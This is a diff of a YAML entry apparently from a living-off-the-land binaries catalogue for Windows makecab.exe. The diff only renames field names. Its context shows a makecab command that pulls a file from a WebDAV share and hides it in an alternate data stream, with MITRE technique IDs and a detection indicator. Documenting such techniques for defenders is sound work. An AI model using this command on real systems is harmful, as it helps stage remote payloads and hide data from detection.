@@ -15,7 +15,7 @@ Commands:
   - Command: makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
     Description: Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.
     Usecase: Hide data compressed into an alternate data stream
-    Category: Alternate data streams
+    Category: ADS
     Privileges: User
     MitreID: T1096
     MitreLink: https://attack.mitre.org/wiki/Technique/T1096
@@ -28,10 +28,10 @@ Commands:
     MitreID: T1105
     MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-Full Path:
+Full_Path:
   - Path: C:\Windows\System32\makecab.exe
   - Path: C:\Windows\SysWOW64\makecab.exe
-Code Sample: 
+Code_Sample: 
 - Code:
 Detection:
  - IOC: Makecab getting files from Internet
